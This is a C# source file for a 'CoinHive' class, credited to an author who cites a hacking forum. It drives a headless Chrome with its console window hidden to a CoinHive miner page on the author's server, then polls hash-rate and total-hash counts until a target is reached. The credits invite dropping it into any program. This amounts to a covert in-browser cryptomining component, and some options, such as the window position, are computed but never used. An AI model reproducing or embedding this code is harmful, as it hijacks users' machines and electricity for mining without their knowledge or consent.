using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
namespace CoinHive
{
    public class CoinHive
    {
        /* 
        Created by Bish0pQ
        You can use this in whatever program you like, but it's obligated to leave this credits.
        http://www.bish0pq.pw
        Proud member of Sinister.ly        
        */

        //Attributes
        private int _totalHash;
        private int _accHash;
        private double _hashPerSec;
        private double _hashesToGen;
        private string _url;
        private double _currTotHash = 0;
        private double _currHashPerSec;
        private double _currAccHash;
        private string _winPos;

        //Props
        public double CurrTotHash 
        {
            get { return _currTotHash; }
            set { _currTotHash = value; }
        }

        public string WinPos
        {
            get { return _winPos; }
            set
            {
                if (value == "hidden")
                {
                    _winPos = "--window-position=-32000,-32000";
                }
                else
                {
                    _winPos = "--window-position=0,0";
                }
            }
        }

        public double CurrAccHash
        {
            get { return _currAccHash; }
            set { _currAccHash = value; }
        }

        public double CurrHashPerSec
        {
            get { return Math.Round(_hashPerSec, 2); }
            set { _hashPerSec = value; }
        }
        public double HashesToGen
        {
            get { return _hashesToGen; }
            set { _hashesToGen = value; }
        }

        public int TotalHash
        {
            get { return _totalHash; }
            set { _totalHash = value; }
        }

        public int AccHash
        {
            get { return _accHash; }
            set { _accHash = value; }
        }

        public double HashPerSec
        {
            get { return _hashPerSec; }
            set { _hashPerSec = value; }
        }

        public string Url
        {
            get { return _url; }
            set { _url = value; }
        }

        //Constructors
        public CoinHive(string url, string winPos)
        {
            this.Url = url;
        }

        public CoinHive() : this("http://www.bish0pq.pw/files/CoinHive/ver_script.html", "hidden") { }
        

        //Methods
        public void VerScript(double amt_hash, int interval, string WinPosition)
        {
            //Variables
            double hps;
            double th;
            double ah;

            //Check if the window should be hidden
            if (WinPosition == "hidden")
            {
                WinPos = "hidden";
            }
            else
            {
                WinPos = "";
            }

            //Chromedriver options
           ChromeDriverService Cserv = ChromeDriverService.CreateDefaultService();
           var opts = new ChromeOptions();
           opts.AddArgument("headless");
           Cserv.HideCommandPromptWindow = true;
           ChromeDriver driver = new ChromeDriver(Cserv, opts);
           IWebElement el;
            


            //Start the chromedriver
            driver.Navigate().GoToUrl(Url);

            //Check values
            while (CurrTotHash < amt_hash)
            {
                //Grab text from webbrowser
                el = driver.FindElement(By.Id("hps"));
                string str_hps = el.Text;
                if (double.TryParse(str_hps, out hps))
                {
                    //Parse is succesfull
                    if (hps > 1000)
                    {
                        double.TryParse(str_hps.Replace(".", ","), out hps);
                    }
                }

                el = driver.FindElement(By.Id("th"));
                string str_th = el.Text;
                el = driver.FindElement(By.Id("ah"));
                string str_ah = el.Text;
                
                //Parse the variables to double
                double.TryParse(str_th, out th);
                double.TryParse(str_ah, out ah);

                //Set props
                this.CurrHashPerSec = hps;
                this.CurrTotHash = th;
                this.CurrAccHash = ah;
               
            }

            driver.Quit();
        }



    }
}
